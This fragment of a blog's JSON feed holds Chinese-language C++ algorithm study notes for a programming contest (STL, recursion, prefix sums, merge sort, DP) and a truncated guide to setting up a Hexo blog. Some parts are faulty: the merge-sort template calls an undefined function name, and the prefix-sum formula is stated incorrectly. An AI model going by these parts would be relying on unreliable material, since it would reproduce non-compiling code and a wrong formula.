punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                    <span class=\"token property\">\"ignoreFailures\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token property\">\"preLaunchTask\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"C/C++: g++.exe 生成活动文件\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token property\">\"version\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2.0.0\"</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><strong>tasks.json</strong></p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token property\">\"tasks\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token property\">\"type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cppbuild\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token property\">\"label\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"C/C++: gcc.exe 生成活动文件\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token property\">\"command\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"D:\\\\mingw64\\\\bin\\\\g++.exe\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token property\">\"args\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                <span class=\"token string\">\"-fdiagnostics-color=always\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token string\">\"-g\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token string\">\"$&#123;file&#125;\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                <span class=\"token string\">\"-o\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                <span class=\"token string\">\"$&#123;fileDirname&#125;\\\\$&#123;fileBasenameNoExtension&#125;.exe\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token property\">\"options\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token property\">\"cwd\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"$&#123;fileDirname&#125;\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token property\">\"problemMatcher\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token string\">\"$gcc\"</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token property\">\"group\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"build\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token property\">\"detail\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"调试器生成的任务。\"</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token property\">\"type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cppbuild\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token property\">\"label\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"C/C++: g++.exe 生成活动文件\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token property\">\"command\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"D:\\\\mingw64\\\\bin\\\\g++.exe\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token property\">\"args\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token string\">\"-fdiagnostics-color=always\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token string\">\"-g\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token string\">\"$&#123;file&#125;\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token string\">\"-o\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                <span class=\"token string\">\"$&#123;fileDirname&#125;\\\\$&#123;fileBasenameNoExtension&#125;.exe\"</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token property\">\"options\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token property\">\"cwd\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"$&#123;fileDirname&#125;\"</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token property\">\"problemMatcher\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                <span class=\"token string\">\"$gcc\"</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token property\">\"group\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                <span class=\"token property\">\"kind\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"build\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                <span class=\"token property\">\"isDefault\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token property\">\"detail\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"调试器生成的任务。\"</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token property\">\"version\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2.0.0\"</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"插件\"><a class=\"anchor\" href=\"#插件\">#</a> 插件</h1>\n<ol>\n<li>aiXcoder Code</li>\n<li>c/c++</li>\n<li>Chinese</li>\n<li>Error Lens</li>\n<li>Moonlight</li>\n</ol>\n<h1 id=\"万能头文件\"><a class=\"anchor\" href=\"#万能头文件\">#</a> 万能头文件</h1>\n<pre><code class=\"language-c++\">#include &lt;bits/stdc++.h&gt;\n</code></pre>\n<h1 id=\"cincout加速\"><a class=\"anchor\" href=\"#cincout加速\">#</a> cin,cout 加速</h1>\n<ol>\n<li>取消输入输出缓存</li>\n<li>设置空参数时返回当前的输出流指针</li>\n</ol>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\nint main() \n&#123;\n    std::ios::sync_with_stdio(false);\n    std::cin.tie(0); \n    // IO\n&#125;\n</code></pre>\n<p><code>不加using namespace std;</code>  需要写 std::</p>\n<h1 id=\"stl\"><a class=\"anchor\" href=\"#stl\">#</a> STL</h1>\n<pre><code class=\"language-c++\">vector, 变长数组，倍增的思想\n    size()  返回元素个数\n    empty()  返回是否为空\n    clear()  清空\n    front()/back()\n    push_back()/pop_back()\n    begin()/end()\n    []\n    支持比较运算，按字典序\n\npair&lt;int, int&gt;\n    first, 第一个元素\n    second, 第二个元素\n    支持比较运算，以first为第一关键字，以second为第二关键字（字典序）\n\nstring，字符串\n    size()/length()  返回字符串长度\n    empty()\n    clear()\n    substr(起始下标，(子串长度))  返回子串\n    c_str()  返回字符串所在字符数组的起始地址\n\nqueue, 队列\n    size()\n    empty()\n    push()  向队尾插入一个元素\n    front()  返回队头元素\n    back()  返回队尾元素\n    pop()  弹出队头元素\n\npriority_queue, 优先队列，默认是大根堆\n    size()\n    empty()\n    push()  插入一个元素\n    top()  返回堆顶元素\n    pop()  弹出堆顶元素\n    定义成小根堆的方式：priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; q;\n\nstack, 栈\n    size()\n    empty()\n    push()  向栈顶插入一个元素\n    top()  返回栈顶元素\n    pop()  弹出栈顶元素\n\ndeque, 双端队列\n    size()\n    empty()\n    clear()\n    front()/back()\n    push_back()/pop_back()\n    push_front()/pop_front()\n    begin()/end()\n    []\n\nset, map, multiset, multimap, 基于平衡二叉树（红黑树），动态维护有序序列\n    size()\n    empty()\n    clear()\n    begin()/end()\n    ++, -- 返回前驱和后继，时间复杂度 O(logn)\n\n    set/multiset\n        insert()  插入一个数\n        find()  查找一个数\n        count()  返回某一个数的个数\n        erase()\n            (1) 输入是一个数x，删除所有x   O(k + logn)\n            (2) 输入一个迭代器，删除这个迭代器\n        lower_bound()/upper_bound()\n            lower_bound(x)  返回大于等于x的最小的数的迭代器\n            upper_bound(x)  返回大于x的最小的数的迭代器\n    map/multimap\n        insert()  插入的数是一个pair\n        erase()  输入的参数是pair或者迭代器\n        find()\n        []  注意multimap不支持此操作。 时间复杂度是 O(logn)\n        lower_bound()/upper_bound()\n\nunordered_set, unordered_map, unordered_multiset, unordered_multimap, 哈希表\n    和上面类似，增删改查的时间复杂度是 O(1)\n    不支持 lower_bound()/upper_bound()， 迭代器的++，--\n\nbitset, 圧位\n    bitset&lt;10000&gt; s;\n    ~, &amp;, |, ^\n    &gt;&gt;, &lt;&lt;\n    ==, !=\n    []\n\n    count()  返回有多少个1\n\n    any()  判断是否至少有一个1\n    none()  判断是否全为0\n\n    set()  把所有位置成1\n    set(k, v)  将第k位变成v\n    reset()  把所有位变成0\n    flip()  等价于~\n    flip(k) 把第k位取反\n</code></pre>\n<h1 id=\"蓝桥杯备赛\"><a class=\"anchor\" href=\"#蓝桥杯备赛\">#</a> 蓝桥杯备赛</h1>\n<p>直接刷题，官方第一期（差分，前缀和，单调队列）第二期第三期模拟题</p>\n<p>关键：刷针对性的题（字符串，大数计算，全排列，递归，回溯，搜索）</p>\n<h1 id=\"递归\"><a class=\"anchor\" href=\"#递归\">#</a> 递归</h1>\n<p>&lt;img src=&quot;C:\\Users\\LENOVO\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240223210102890.png&quot; alt=&quot;image-20240223210102890&quot; style=&quot;zoom: 80%;&quot; /&gt;</p>\n<p><em><strong>自己调用自己</strong></em>，最重要的是<strong>顺序</strong>（DFS 也是）</p>\n<p>从 1 到 n 依次考虑每个数选或者不选</p>\n<pre><code class=\"language-c++\">int f(int n)\n&#123;\n    f&#123;n - 1&#125;\n&#125;\n\nscanf printf（&gt;=10的5次方）：稍微长点，速度巨快\ncin cout（&lt;10的5次方）：稍微短点，速度巨慢 \n\n常用头文件\n#include&lt;iostream&gt;\n#include&lt;cstdio&gt;\n#include&lt;cstring&gt;\n#include&lt;algorithm&gt;\n</code></pre>\n<p><strong>斐波那契数列</strong></p>\n<pre><code class=\"language-C++\">#include&lt;iostream&gt;\n#include&lt;cstring&gt;\n#include&lt;cstdio&gt;\n\nusing namespace std;\n\nint f(int n) &#123;\n    if(n==1) return 1;\n    if(n==2) return 2;\n    return f(n-1) + f(n-2);\n&#125;\n\nint main() &#123;\n    int n;\n    cin &gt;&gt; n;\n\n    cout &lt;&lt; f(n) &lt;&lt; endl;\n\n    return 0;\n&#125;\n</code></pre>\n<p><strong>分析方式</strong>：所有递归 =&gt; 递归搜索树</p>\n<p>向下递归 + 向上回溯</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240114184719472.png\" alt=\"image-20240114184719472\" /></p>\n<p><strong>需要牢记的知识</strong></p>\n<p>2^1 —— 2^10</p>\n<p>2^20 ≈ 100 万</p>\n<p>2^16 = 65536</p>\n<p>2^15 = 32768</p>\n<p>2^63 ≈ 10^18</p>\n<p>从时间复杂度入手猜测解题算法</p>\n<h2 id=\"指数型枚举\"><a class=\"anchor\" href=\"#指数型枚举\">#</a> 指数型枚举</h2>\n<p><strong>acwing92</strong></p>\n<p>每次两个分支，选 / 不选（位数变化）</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240114201307669.png\" alt=\"image-20240114201307669\" /></p>\n<h2 id=\"排列型枚举\"><a class=\"anchor\" href=\"#排列型枚举\">#</a> 排列型枚举</h2>\n<p><strong>acwing94</strong></p>\n<p>按照<strong>字典序</strong>，字典序较小的排在前面</p>\n<ol>\n<li>依次枚举每个数放到哪个位置</li>\n<li>依次枚举每个位置放哪个数</li>\n</ol>\n<p>深度优先搜索 DFS</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240203095347456.png\" alt=\"image-20240203095347456\" /></p>\n<h2 id=\"组合型枚举\"><a class=\"anchor\" href=\"#组合型枚举\">#</a> 组合型枚举</h2>\n<p><strong>acwing93</strong></p>\n<p>数字<strong>不考虑字典序位次</strong>顺序，需要按<strong>前后大小顺序</strong>排列（局部比较处理）</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240220233722294.png\" alt=\"image-20240220233722294\" /></p>\n<p>参数：</p>\n<ol>\n<li>存三个位置的数组 way [i]</li>\n<li>当前枚举到的<strong>位置</strong> u（m 位中的某个位置）</li>\n<li>当前可以枚举的最小数 start（n 个数中的后续未被选的数）</li>\n</ol>\n<p><strong>剪枝策略</strong>：当选了 u-1 个数时，此时枚举到第 u 个数，如果后续 start 到 n 的所有数都被选上仍不足以组合成 m 位，就进行剪枝</p>\n<h1 id=\"二分\"><a class=\"anchor\" href=\"#二分\">#</a> 二分</h1>\n<p>能否二分的界定标准：状态的决策过程或者序列是否满足<strong>单调性</strong>或者可以<strong>局部舍弃性</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CDesktop%5CWorkSpace%5CLanQiaoBei%5Cimages%5Cerfen.png\" alt=\"erfen\" /></p>\n<h1 id=\"差分\"><a class=\"anchor\" href=\"#差分\">#</a> 差分</h1>\n<p>当数组 <code>[l，r]</code>  区间内的值都需要更新（<strong>传统暴力</strong>）时，一个一个更新很耗费时间，所以差分数组可以在 <code>a[l]，a[r+1]</code>  处进行修改，例如区间内每个值要加一，则可以实现为 <code>a[l]++</code> ， <code>a[r+1]--</code>  ，进行一次前缀和</p>\n<p>原数组 <code>a[]</code>  是差分数组 <code>b[]</code>  的前缀和，原数组每次更新状态时，与之对应状态的差分数组求和即可，所以差分数组就可以写成 &lt;u&gt; 前后两个状态的原数组的差值 &lt;/u&gt;；</p>\n<p>同时原数组接下来的 &lt;u&gt; 每一个状态 &lt;/u &gt; 都会因为这个 &lt; u &gt; 前置状态的改变而改变 &lt;/u&gt;，当出现了前置状态变化，需要对原数组 <code>a[s,t]</code>  以及差分数组区间 <code>b[s,t]</code>  每个值逐步更新时，观察规律，只需改变差分数组 <code>b[s]++d</code>  和 <code>b[t]--d</code> ，即可完成状态更替，再通过差分数组求得其<strong>前缀和</strong>，也就是原数组</p>\n<p>差分数组和为 0，正数负数可以相加抵消</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CDesktop%5CWorkSpace%5CLanQiaoBei%5Cimages%5Cchafen.png\" alt=\"chafen\" /></p>\n<h1 id=\"前缀和\"><a class=\"anchor\" href=\"#前缀和\">#</a> 前缀和</h1>\n<p>用数列去理解</p>\n<pre><code class=\"language-c++\">S[1] = a[1]\nS[2] = a[1] + a[2] = S[1] + a[2]\n\n...\n\nS[k] = S[k-1] + a[k] = S[k-1] + S[k-2] + a[k] = ...\n</code></pre>\n<p>所以可以推出：若想求 <code>区间L至R</code>  的长度，即 <code>L-R</code> ， <code>L-R=S[R]-S[L]=a[R]-a[L]</code></p>\n<pre><code class=\"language-c++\">S[L] = a[1] + ... + a[L-1]\nS[R] = a[1] + ... + a[L-1] + a[L] + ... + a[R]\n</code></pre>\n<h1 id=\"贪心\"><a class=\"anchor\" href=\"#贪心\">#</a> 贪心</h1>\n<h1 id=\"排序\"><a class=\"anchor\" href=\"#排序\">#</a> 排序</h1>\n<p>STL 库封装</p>\n<h2 id=\"归并排序\"><a class=\"anchor\" href=\"#归并排序\">#</a> 归并排序</h2>\n<p>建立在归并操作上的一种有效的排序算法，该算法是采用 <code>分治法</code> 的一个非常典型的应用。将已有序的子序列合并，得到完全有序的序列；即 <code>先使每个子序列有序，再使子序列段间有序</code> 。</p>\n<p><strong>步骤</strong></p>\n<ol>\n<li><strong>分</strong>：先递归将数组分成 <code>只有一个元素</code> 的有序数组</li>\n<li><strong>治</strong>：合二为一：将两个有序数组合并成一个有序数组（就是 <code>二路归并</code> ）</li>\n</ol>\n<p><strong>模板</strong></p>\n<pre><code class=\"language-c++\">#include &lt;bits/stdc++.h&gt;\n\nusing namespace std;\n\nconst int N = 100010;\n\nint n, q[N], tmp[N];\n\nvoid merge_sort(int l, int r) &#123;\n    if (l == r) return;\n    int mid = l + r &gt;&gt; 1;\n    //分\n    mergesort(l, mid);\n    mergesort(mid + 1, r);\n    //治（合并）\n    //tmp数组临时存放我们合并的有序序列\n    //i是第一个序列的头，j是第二个序列的头\n    int i = l, j = mid + 1, k = 0;\n    while (i &lt;= mid &amp;&amp; j &lt;= r) &#123;\n        //找小的存进tmp中\n        if (q[i] &lt;= q[j]) tmp[k ++] = q[i ++];\n        else tmp[k ++] = q[j ++];\n    &#125;\n    //如果还剩下有没放进tmp中的，就按顺序插入tmp的末尾\n    //这两个循环最多只会执行一个\n    while (i &lt;= mid) tmp[k ++] = q[i ++];\n    while (j &lt;= r) tmp[k ++] = q[j ++];\n    //再把tmp中的数据copy会原数组里\n    for (int i = l, j = 0; i &lt;= r; i ++, j ++)\n        q[i] = tmp[j];\n&#125;\n\nint main() &#123;\n    cin &gt;&gt; n;\n    for (int i = 0; i &lt; n; i ++)\n        cin &gt;&gt; q[i];\n    mergesort(0, n - 1);\n    for (int i = 0; i &lt; n; i ++)\n        cout &lt;&lt; q[i] &lt;&lt; &quot; &quot;;\n    return 0;\n&#125;\n</code></pre>\n<p><strong>&lt;vector&gt; 实现模板</strong></p>\n<p><code>emplace_back</code>  是 C++ 中用于在容器的末尾直接构造对象并添加到容器中的函数。分别将  <code>nums</code>  中的元素  <code>nums[i]</code>  和  <code>nums[j]</code>  添加到  <code>t</code>  中，而不是创建临时对象然后再复制将其添加到  <code>t</code>  中。这样做的好处是可以避免不必要的对象复制和移动，提高效率。</p>\n<pre><code class=\"language-c++\">//输入向量类容器，对[l.r]进行排序\nvoid merge_sort(vector&lt;int&gt;&amp; nums, int l, int r) &#123;\n    if (l &gt;= r) &#123;\n        return;\n    &#125;\n    \n    int mid = l + r &gt;&gt; 1;\n    merge_sort(nums, l, mid);\n    merge_sort(nums, mid+1, r);\n    \n    int i = l, j = mid+1;\n    vector&lt;int&gt; t;\n    while (i &lt;= mid &amp;&amp; j &lt;= r) &#123;\n        if (nums[i] &lt;= nums[j]) &#123;\n            t.emplace_back(nums[i++]);\n        &#125; else &#123;\n            t.emplace_back(nums[j++]);\n        &#125;\n    &#125;\n    while (i &lt;= mid) &#123;\n        t.emplace_back(nums[i++]);\n    &#125;\n    while (j &lt;= r) &#123;\n        t.emplace_back(nums[j++]);\n    &#125;\n    \n    for (int i = l, j = 0; i &lt;= r; ++i, ++j) &#123;\n        nums[i] = t[j];\n    &#125;\n    \n    return;\n&#125;\n</code></pre>\n<h1 id=\"区间合并\"><a class=\"anchor\" href=\"#区间合并\">#</a> 区间合并</h1>\n<p><strong>模板</strong></p>\n<pre><code class=\"language-c++\">// 将所有存在交集的区间合并\nvoid merge(vector&lt;PII&gt; &amp;segs)\n&#123;\n    vector&lt;PII&gt; res;\n\n    sort(segs.begin(), segs.end());\n\n    int st = -2e9, ed = -2e9;\n    for (auto seg : segs)\n        if (ed &lt; seg.first)\n        &#123;\n            if (st != -2e9) res.push_back(&#123;st, ed&#125;);\n            st = seg.first, ed = seg.second;\n        &#125;\n        else ed = max(ed, seg.second);\n\n    if (st != -2e9) res.push_back(&#123;st, ed&#125;);\n\n    segs = res;\n&#125;\n</code></pre>\n<h1 id=\"dfs\"><a class=\"anchor\" href=\"#dfs\">#</a> DFS</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl83MjA2MDkyNS9hcnRpY2xlL2RldGFpbHMvMTI4NTMzMDc4\">三类最基础的 DFS 问题</span></p>\n<h1 id=\"剪枝\"><a class=\"anchor\" href=\"#剪枝\">#</a> 剪枝</h1>\n<p>优化搜索顺序，排除等效冗余，可行性剪枝，最优性剪枝，记忆化搜索</p>\n<h1 id=\"dp\"><a class=\"anchor\" href=\"#dp\">#</a> DP</h1>\n<p>爬楼梯</p>\n<pre><code class=\"language-c++\">#include &lt;bits/stdc++.h&gt;\nusing namespace std;\n\nconst int N = 1000010, MOD = 1000000007;\ntypedef long long LL;\nLL n;\nLL a, b, c;\nLL dp[N] = &#123;0&#125;;\n\nint main()\n&#123;\n  scanf(&quot;%lld&quot;, &amp;n);\n  scanf(&quot;%lld%lld%lld&quot;, &amp;a, &amp;b, &amp;c);\n  // dp[]初始化\n  dp[0] = 1;\n  for (int i = 1; i &lt;= n; i ++ ) &#123;\n    // 第i级台阶可以由第i-a或i-b或i-c级台阶到达\n    if (i - a &gt;= 0) dp[i] += dp[i - a];\n    if (i - b &gt;= 0) dp[i] += dp[i - b];\n    if (i - c &gt;= 0) dp[i] += dp[i - c];\n    dp[i] %= MOD;\n  &#125;\n\n  printf(&quot;%lld&quot;, dp[n]);\n\n  return 0;\n&#125;\n</code></pre>\n<h1 id=\"小众算法\"><a class=\"anchor\" href=\"#小众算法\">#</a> 小众算法</h1>\n<h2 id=\"gospers-hack\"><a class=\"anchor\" href=\"#gospers-hack\">#</a> Gosper's Hack</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNjA1MTIyOTY=\">https://zhuanlan.zhihu.com/p/360512296</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phc29uY2hlbl9nYmQvYXJ0aWNsZS9kZXRhaWxzLzQ0OTQ4NTIz\">https://blog.csdn.net/jasonchen_gbd/article/details/44948523</span></p>\n<p>利用位运算，生成 n 元集合所有 k 元子集（求组合 C 值）</p>\n<pre><code class=\"language-c++\">void GospersHack(int k, int n)\n&#123;\n    int cur = (1 &lt;&lt; k) - 1;\n    int limit = (1 &lt;&lt; n);\n    while (cur &lt; limit)\n    &#123;\n        // do something\n        int lb = cur &amp; -cur;\n        int r = cur + lb;\n        cur = ((r ^ cur) &gt;&gt; __builtin_ctz(lb) + 2) | r;\n        // 或：cur = (((r ^ cur) &gt;&gt; 2) / lb) | r;\n    &#125;\n&#125;\n</code></pre>\n<p><strong>__builtin_ctz(x)</strong>：x 末尾 0 的个数。x=0 时结果未定义。</p>\n<h1 id=\"参考\"><a class=\"anchor\" href=\"#参考\">#</a> 参考</h1>\n<ol>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9ibG9nL2NvbnRlbnQvMjc3Lw==\">https://www.acwing.com/blog/content/277/</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWN3aW5nLmNvbS9zb2x1dGlvbi9jb250ZW50LzEzODMxNi8=\">https://www.acwing.com/solution/content/138316/</span></li>\n</ol>\n",
            "tags": [
                "算法",
                "Algorithm"
            ]
        },
        {
            "id": "http://yoursite.com/As%20Developers/Hexo+Shoka%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/",
            "url": "http://yoursite.com/As%20Developers/Hexo+Shoka%E4%B8%BB%E9%A2%98%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/",
            "title": "Github Pages+Hexo搭建个人Blog",
            "date_published": "2024-03-16T15:29:08.000Z",
            "content_html": "<h1 id=\"github\"><a class=\"anchor\" href=\"#github\">#</a> Github</h1>\n<ol>\n<li>Github 账号</li>\n<li>创建 Github 仓\n<ul>\n<li>仓库名 <code>[username].github.io</code></li>\n<li>仓库描述 Description</li>\n<li>...</li>\n<li>其余保持原设置</li>\n</ul>\n</li>\n<li>本地安装 NodeJS，npm 命令</li>\n<li>本地安装 Git</li>\n</ol>\n<h1 id=\"hexo\"><a class=\"anchor\" href=\"#hexo\">#</a> Hexo</h1>\n<p><code>npm install -g hexo-cli</code></p>\n<p><code>hexo -v</code></p>\n<p><code>hexo init xh1xxhg</code></p>\n<p><code>cd xh1xxhg</code></p>\n<p><code>npm install</code></p>\n<p><strong>启动（本地测试）</strong></p>\n<p><code>hexo clean</code>  该命令可以解决一些报错，比如说代码块显示不完整</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnR3aW5rbGluZy50b3AvMjAyMy8xMS8xNi9ub3RlL3Nob2thJTIwJUU0JUI4JUJCJUU5JUEyJTk4JUU2JTkwJUFEJUU1JUJCJUJBJUU4JUJGJTg3JUU3JUE4JThCLw==\">shoka 主题搭建过程</span></p>\n<p><code>hexo g</code></p>\n<p><code>hexo server</code></p>\n<h1 id=\"shoka主题\"><a class=\"anchor\" href=\"#shoka主题\">#</a> Shoka 主题</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==\">https://github.com/amehime/hexo-theme-shoka</span></p>\n<p>配置教学博客</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaG9rYS5sb3N0eXUubWUvY2F0ZWdvcmllcy9jb21wdXRlci1zY2llbmNlL25vdGUvdGhlbWUtc2hva2EtZG9jLw==\">https://shoka.lostyu.me/categories/computer-science/note/theme-shoka-doc/</span></p>\n<p><code>git clone https://github.com/amehime/hexo-theme-shoka.git ./themes/shoka</code></p>\n<h1 id=\"plugins\"><a class=\"anchor\" href=\"#plugins\">#</a> Plugins</h1>\n<p><strong>修改站点配置文件</strong></p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token key atrule\">theme</span><span class=\"token punctuation\">:</span> landscape</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>=<span class=\"token punctuation\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token key atrule\">theme</span><span class=\"token punctuation\">:</span> shoka</pre></td></tr></table></figure><p><strong>hexo-renderer-multi-markdown-it</strong></p>\n<p>删除原 markdown 渲染器 <code>npm un hexo-renderer-marked --save</code></p>\n<pre><code>npm i hexo-renderer-multi-markdown-it --save\n</code></pre>\n<p><strong>autoprofixer</strong></p>\n<pre><code>npm install hexo-autoprefixer --save\n</code></pre>\n<p><strong>hexo-algoliasearch</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MTczNDA0L2FydGljbGUvZGV0YWlscy8xMjI4NjEzMjE=\">Hexo 集成 Algolia 实现搜索功能</span></p>\n<pre><code>npm 